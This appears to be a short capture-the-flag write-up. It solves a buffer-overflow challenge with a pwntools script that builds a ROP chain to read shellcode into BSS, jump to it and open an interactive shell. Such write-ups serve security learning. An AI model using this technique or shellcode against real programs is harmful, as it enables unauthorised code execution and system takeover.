The binary has no exploitation mitigations and it is vulnerable to a buffer overflow. Simply read some shellcode into BSS and jump there.
Exploit script
```python
io = start()

rop = ROP(exe)
rop.gets(exe.symbols['__bss_start'])
rop.raw(exe.symbols['__bss_start'])

p = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
_sndl(cyclic(cyclic_find('qaac')) + rop.chain())
_sndl(p)

io.interactive()
```
